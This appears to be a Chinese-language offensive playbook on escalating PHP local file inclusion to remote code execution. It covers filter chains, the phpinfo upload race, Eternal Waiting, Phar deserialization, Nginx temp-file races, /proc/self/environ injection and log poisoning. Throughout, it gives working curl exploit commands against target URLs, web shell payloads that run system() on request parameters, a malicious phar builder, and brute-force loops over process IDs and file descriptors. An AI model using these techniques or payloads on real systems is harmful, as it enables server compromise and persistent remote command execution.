# LFI 到 RCE 提权路径详解

> 本文档覆盖 lfi-to-rce.md **未展开**的进阶 LFI2RCE 技术。基础日志投毒、PHP Wrapper、pearcmd、Session 文件包含和 Filter Chain 生成器用法请参考 [lfi-to-rce.md](lfi-to-rce.md)。

---

## PHP Filter Chain 任意写入原理（convert.iconv）

通过 `php://filter` 链式叠加 `convert.iconv` 编码转换，在 `include()` 时凭空生成任意 PHP 代码，无需写文件、无需日志、无需 session。

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|<逐字符 iconv 链>|convert.base64-decode/resource=php://temp
```

### 逐字符构造过程

1. `convert.iconv.UTF8.CSISO2022KR` 向字符串头部注入 `\x1b$)C`
2. 选择特定 iconv 编码对，使注入的字节经转换后仅保留一个有效 base64 字符
3. `convert.base64-decode | convert.base64-encode` 清除所有非 base64 字符
4. `convert.iconv.UTF8.UTF7` 清除等号
5. 重复 1-4 直到拼完整个 base64 payload，最终 `convert.base64-decode` 得到 PHP 代码

### php://temp 绕过后缀限制

当 `include($_GET['f'].'.php')` 拼接后缀时，用 `php://temp` 作为 resource——它允许任意后缀附加而不影响 filter 执行：

```bash
curl "http://target/vuln.php?f=php://filter/<chain>/resource=php://temp"
```

### Error-Based Oracle 盲读文件

LFI 无回显时，利用 `convert.iconv.UTF8.UCS-4LE` 制造内存膨胀 + `dechunk` 做布尔判断：

- 首字符为十六进制 -> dechunk 正常处理 -> 无报错
- 首字符非十六进制 -> dechunk 清空 -> 内存炸弹触发 PHP 错误

工具：`php_filter_chains_oracle_exploit`、`lightyear`

---

## phpinfo + 条件竞争上传

### 前提条件

- 存在可访问的 `phpinfo()` 页面 + LFI 漏洞 + `file_uploads = On`

### 攻击原理

PHP 收到 multipart 上传时创建临时文件（`/tmp/phpXXXXXX`），请求结束后立即删除。phpinfo() 打印 `$_FILES[tmp_name]` 暴露路径。利用输出缓冲分块刷新，在临时文件删除前通过 LFI 包含它。

### 攻击步骤

```bash
# 1. 大 POST 请求发往 phpinfo 页面，padding 促使提前刷新输出
# 2. 流式响应中解析 $_FILES[tmp_name]（注意 HTML 编码 =&gt;）
# 3. 立即用 LFI 包含该临时路径
# 4. payload 写持久 shell：
#    <?php file_put_contents('/tmp/.p.php','<?php system($_GET["x"]); ?>'); ?>
```

### 关键参数检查

| 参数 | 要求 |
|------|------|
| `file_uploads` | On |
| `upload_tmp_dir` | LFI 可达的路径 |
| `output_buffering` | 越小越好（4096 常见） |
| `open_basedir` | 不阻止 include 临时目录 |

提高成功率：多线程并发 10-20 worker；Padding 放在 URL 参数/Cookie/User-Agent/Accept-Language（各 5-10KB）；socket 级别逐块读取响应。

---

## Eternal Waiting（永久等待 + 暴力枚举）

PHP 上传产生 `/tmp/php[a-zA-Z0-9]{6}` 临时文件。让 LFI 的 include 永远不返回，临时文件就不会被删除。

### 使 include 永久挂起

```bash
# /sys/kernel/security/apparmor/revision 读取时永久阻塞（非 Docker 环境）
curl "http://target/vuln.php?file=../../../sys/kernel/security/apparmor/revision"
```

### 攻击流程

1. 用 N-1 个连接发带 webshell 的上传请求（每个 20 文件），同时 include 阻塞文件使其挂起
2. 临时文件持续存在：`(N-1) * 20` 个
3. 最后一个连接暴力枚举 `/tmp/phpXXXXXX`

### 时间估算

- 文件名空间：62^6 = 56,800,235,584
- 150 连接 * 20 文件 = 2,980 个临时文件，10 req/s -> 约 530 小时
- PHP-FPM + `request_terminate_timeout=30s`：请求超时但临时文件不删除，积累 10 万文件后降至约 30 分钟

---

## Phar 反序列化

Phar 文件 metadata 以序列化格式存储。使用 `phar://` 访问时 metadata 自动反序列化——即使函数本身不执行代码。

### 可触发的函数

`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`

### 利用步骤

```php
// 构造恶意 phar（本地执行）
<?php
class TargetClass {
    public $cmd = 'id';
    function __destruct() { system($this->cmd); }
}
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('x.txt', 'padding');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPG 魔术字节
$phar->setMetadata(new TargetClass());
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 create_phar.php
# 上传 evil.phar（可改后缀 .jpg 绕过检测），通过 LFI 触发
curl "http://target/vuln.php?file=phar://uploads/evil.jpg/x.txt"
```

前提：能上传文件 + 目标有可利用的 `__destruct()`/`__wakeup()` 类 + LFI 点使用上述函数之一

---

## Nginx 临时文件竞争

Nginx 反代 PHP 时，请求体超过缓冲（默认 ~8KB）写入磁盘临时文件。Nginx 立即 unlink 文件名但保持 fd 打开，通过 `/proc/<pid>/fd/<fd>` 仍可访问。

### 攻击步骤

```bash
# 1. 枚举 nginx worker PID
for pid in $(seq 100 4000); do
    curl -s "http://target/vuln.php?file=../../../proc/$pid/cmdline" | \
    grep -q "nginx" && echo "PID: $pid"
done

# 2. 发超大请求体（含 payload），故意不发完保持 fd 打开
# Content-Length 声明 1MB 但只发送 16KB，连接挂起 ~60s

# 3. 暴力枚举 fd（通常 10-45）
for fd in $(seq 10 45); do
    curl -s "http://target/vuln.php?file=../../../proc/$PID/fd/$fd"
done
```

绕过 `realpath()` 的 /proc 路径链：`/proc/<pidA>/cwd/proc/<pidB>/root/proc/<pidC>/fd/<fd>`

---

## /proc/self/environ 注入

`/proc/self/environ` 含当前进程环境变量，`HTTP_USER_AGENT` 反映 User-Agent 头。通过 LFI include 此文件时注入的 PHP 代码会被执行：

```bash
curl "http://target/vuln.php?file=../../../proc/self/environ" \
     -H "User-Agent: <?php system(\$_GET['c']); ?>"
```

注意：需 `/proc` 可访问（Docker 中常受限）；使用 `--ignore-content-length` 处理伪文件。

---

## 日志投毒扩展路径

lfi-to-rce.md 已覆盖 Apache/Nginx access.log，以下为补充：

### SSH auth.log 投毒

```bash
ssh '<?php system($_GET["c"]); ?>'@target
curl "http://target/vuln.php?file=../../../var/log/auth.log&c=id"
```

路径：`/var/log/auth.log`（Debian）、`/var/log/secure`（CentOS）

### FTP vsftpd 日志投毒

用 PHP payload 作为 FTP 用户名登录，包含 `/var/log/vsftpd.log`。

### 邮件投毒

发送含 payload 的邮件到本地用户，包含 `/var/mail/<user>` 或 `/var/spool/mail/<user>`。

### 扩展日志路径

```
/var/log/apache2/error.log    /var/log/nginx/error.log
/var/log/httpd/error_log      /usr/local/apache/log/error_log
/var/log/auth.log             /var/log/secure
/var/log/vsftpd.log           /var/log/mail.log
/var/mail/www-data
```

---

## 技术选择速查表

| 技术 | 前提条件 | 需要写文件 | 难度 |
|------|---------|:---:|:---:|
| PHP Filter Chain | include() + PHP | 否 | 低 |
| phpinfo 竞争 | phpinfo 页面 + file_uploads=On | 临时 | 中 |
| Eternal Waiting | /sys/kernel/security 可读 + 非 Docker | 临时 | 高 |
| Phar 反序列化 | 可上传文件 + 可利用类 | 需上传 | 中 |
| Nginx 临时文件 | Nginx 反代 + /proc 可读 | 否 | 高 |
| /proc/self/environ | /proc 可访问 | 否 | 低 |
| SSH auth.log 投毒 | SSH 开放 + auth.log 可读 | 否 | 低 |
